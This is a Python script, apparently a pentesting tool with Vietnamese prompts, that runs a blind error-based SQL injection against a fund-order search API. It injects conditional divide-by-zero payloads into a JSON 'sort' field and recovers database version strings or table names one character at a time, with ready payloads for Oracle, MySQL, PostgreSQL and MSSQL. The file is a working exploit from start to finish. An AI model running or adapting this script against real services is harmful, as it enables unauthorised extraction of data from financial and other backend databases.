import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# https://api.example.com:443/ms/inv/fundsystem-om/investor/order/search

base_url = input("Nhập URL endpoint: ")
auth_token = input("Nhập Authorization token: ")

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "vi",
    "Content-Type": "application/json",
    "Authorization": f"Bearer {auth_token}",
    "Origin": "https://dev.example.com",
    "Referer": "https://dev.example.com/",
    "Connection": "keep-alive"
}

def send_sqli(payload):
    try:
        # Tạo JSON dữ liệu gửi đi
        json_data = {
            "sourceCode": "909",
            "size": "10",
            "sort": payload,
            "accountNumber": "909C010766"
        }

        response = requests.post(base_url, headers=headers, proxies=proxies, json=json_data, verify=False)
        
        if response.status_code == 200:
            return False
        elif response.status_code == 500:
            return True
        else:
            return None
    except requests.exceptions.SSLError as e:
        print(f"SSL error: {e}")
        return None

def extract_db_version(db_type, max_length=100):
    db_version = ""
    chars = "0123456789. abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-._"

    payload_template = {
        1: lambda db_version, char: (  # Oracle
            f"orderId,(SELECT CASE WHEN (SELECT COUNT(*) FROM v$version "
            f"WHERE banner LIKE '{db_version}{char}%') > 0 "
            f"THEN TO_CHAR(1/0) ELSE NULL END FROM dual)"
        ),
        2: lambda db_version, char: (  # MySQL
            f"orderId,(SELECT IF((SELECT COUNT(*) FROM information_schema.tables "
            f"WHERE table_name LIKE '{db_version}{char}%') > 0, 1/0, NULL))"
        ),
        3: lambda db_version, char: (  # PostgreSQL
            f"orderId,(SELECT CASE WHEN EXISTS (SELECT 1 FROM pg_catalog.pg_tables "
            f"WHERE tablename LIKE '{db_version}{char}%') THEN 1/0 ELSE NULL END)"
        ),
        4: lambda db_version, char: (  # MsSQL
            f"orderId,(SELECT CASE WHEN (SELECT COUNT(*) FROM sys.databases "
            f"WHERE name LIKE '{db_version}{char}%') > 0 THEN 1/0 ELSE NULL END)"
        )
    }

    for i in range(1, max_length + 1):
        found_char = False
        for char in chars:
            payload = payload_template[db_type](db_version, char)
            if send_sqli(payload):
                db_version += char
                print(f"Character found: {char}, current db_version: {db_version}")
                found_char = True
                break
        if not found_char:
            print(f"No more characters found, final db_version: {db_version}")
            break

    return db_version

if __name__ == "__main__":
    print("Chọn loại cơ sở dữ liệu:")
    print("1. Oracle")
    print("2. MySQL")
    print("3. PostgreSQL")
    print("4. MsSQL")
    db_type = int(input("Nhập số tương ứng với loại cơ sở dữ liệu (1-4): "))

    if db_type not in [1, 2, 3, 4]:
        print("Loại cơ sở dữ liệu không hợp lệ.")
    else:
        db_version = extract_db_version(db_type)
        if db_version:
            print(f"Database version: {db_version}")
        else:
            print("Failed")
